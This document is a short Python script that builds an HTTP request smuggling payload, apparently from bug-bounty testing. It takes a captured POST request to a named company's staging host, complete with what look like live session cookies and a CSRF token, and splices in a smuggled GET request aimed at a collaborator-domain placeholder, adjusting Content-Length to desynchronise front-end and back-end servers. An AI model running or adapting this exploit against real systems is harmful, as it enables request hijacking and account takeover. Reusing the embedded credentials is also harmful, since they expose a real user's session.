import  re

request = '''
POST /query HTTP/1.1
Host: app-stage.bill.com
Connection: close
Content-Length: 568
accept: */*
Origin: https://app-stage.bill.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Sec-Fetch-Mode: cors
content-type: application/json
Sec-Fetch-Site: same-origin
Referer: https://app-stage.bill.com/neo/frame/overview
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: un=cmFnbmFyb2t2QGJ1Z2Nyb3dkbmluamEuY29t; mps=1; loginId=00501WOCUJTFMJVJd9fz; mfptid2=!bO6s5zX6mzb70CxT7szLdvIX_BBgfOZTaYH9WN3t5NN16lCz3ZXcygO6YyfxNkS9s; ki_r=; accountType=business; ki_s=; showOnboardingMandatoryCards=false; __zlcmid=uYiZsbvMak9oVI; text-me-app-banner-canceled=true; _ga=GA1.3.2086236014.1569897623; _gid=GA1.3.1963586505.1569897623; _ga=GA1.2.2086236014.1569897623; _gid=GA1.2.1963586505.1569897623; optimizelyEndUserId=oeu1569897725137r0.6857184127183784; bd=1280-578; abts=!bCLwOAEqObsvSRYVL4+wbD6SrS4FmF9ths339AU1b3ug=; _gat=1; signUpChannel=; pni=; ssp=1; scgs=1; cvSplash=1; un_csrf=!btXIwHBFJj7OO84abg9AWZKcgGB43Z8hgcM5mHno6M+2erZmDEW2DABkUH2X/o4Wm6h3oFNmobJzRfiAkCvstnkyFV548/gNBjpWJ+dsG+PA=; oc=1; sid_temp=!bypzCkUS1iBbXp2Jh6ZMeJzMyvT91ZpRD8fEl0Sh04uIcOSNne_sja4lYyPQf4JnH.01; sid=!bSMX24qyHXJ6uInvzSp9bxGcOM_L1OhjMjzFxjFzqbvfbIher19_mDWf_jS1H1rkY.01; pageuid=!bCilWW3n_Tfyeo6XYtECu8m5J1DdVmnzq72tZ99_pRBAILnzkavVFJtn8vF28WiyX; mp_0e2352afb3c18449be133dbb749a96b3_mixpanel=%7B%22distinct_id%22%3A%20%2200801WWLVRHABCMDhxsg%22%2C%22%24device_id%22%3A%20%2216d8530ae8f8dc-043f7c86c35bd5-67e1b3f-e1000-16d8530ae90924%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fapp-stage.bill.com%2FHome%22%2C%22%24initial_referring_domain%22%3A%20%22app-stage.bill.com%22%2C%22%24user_id%22%3A%20%2200801WWLVRHABCMDhxsg%22%2C%22orgId%22%3A%20%2200801WWLVRHABCMDhxsg%22%2C%22userId%22%3A%20%2200601XSNXXIKPCFWxhii%22%2C%22partnerType%22%3A%20%22BDC%22%2C%22organization%22%3A%20%22hdu%22%2C%22receivables%22%3A%20%22AR%22%2C%22payables%22%3A%20%22AP%22%2C%22isBasicOrg%22%3A%20true%2C%22accountingSoftware%22%3A%20%22freshbooks%22%2C%22inviteType%22%3A%20%22Marketing%22%2C%22networkConnections%22%3A%200%2C%22isTrialEnded%22%3A%20false%2C%22pricePlanId%22%3A%20%22ppl010A0000000000010%22%2C%22canPayAnyone%22%3A%20true%2C%22canReceiveFromAnyone%22%3A%20true%2C%22is021Variation%22%3A%20false%2C%22is021Control%22%3A%20false%2C%22isBTXVariation%22%3A%20false%2C%22loginId%22%3A%20%2200501WOCUJTFMJVJd9fz%22%2C%22PNEO-14773%3A%20IP%20value%20prop%20page%20from%20left%20nav%20(15259180229)%22%3A%20%22Variation%20%231%20(15225980109)%22%2C%22BDC-41036%3A%20ACH%20vs%20Check%20estimated%20duration%20%232%20(placeholder)%20(14787360069)%22%3A%20%22Variation%20%231%20-%20show%20ETAs%20(14787200211)%22%7D; ki_t=1569890322353%3B1569890322353%3B1569902830433%3B1%3B4
Transfer-Encoding: chunked

22c
[{"operationName":"OverviewPaymentsInSummary","variables":{},"query":"query OverviewPaymentsInSummary($filters: [Filter]) {\n  paymentsInSummary(filters: $filters) {\n    count\n    totalAmount\n    payments {\n      count {\n        last30Count\n        last7Count\n        todayCount\n        next7Count\n        next30Count\n        __typename\n      }\n      amount {\n        last30Total\n        last7Total\n        todayTotal\n        next7Total\n        next30Total\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}]
0

'''


prefix = '''GET  /hopefully404 HTTP/1.1
Host: your-collaborator-domain
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1'''

print("reqeust   "+ request )

h = hex(len(prefix))
print(h)
chunk_size = h.lstrip("0x")
print("chunk_size  "+chunk_size)

attack = request.replace('0\n\n', chunk_size+'\r\n'+prefix+'\r\n0\r\n\r\n')
print("attack1  " + attack)

content_length = re.search('Content-Length: ([\d]+)', attack).group(1)
print("content_length  "+ content_length)

attack = attack.replace('Content-Length: '+content_length, 'Content-length: '+str(int(content_length)+len(chunk_size)-3))
print("attack2 " +attack)

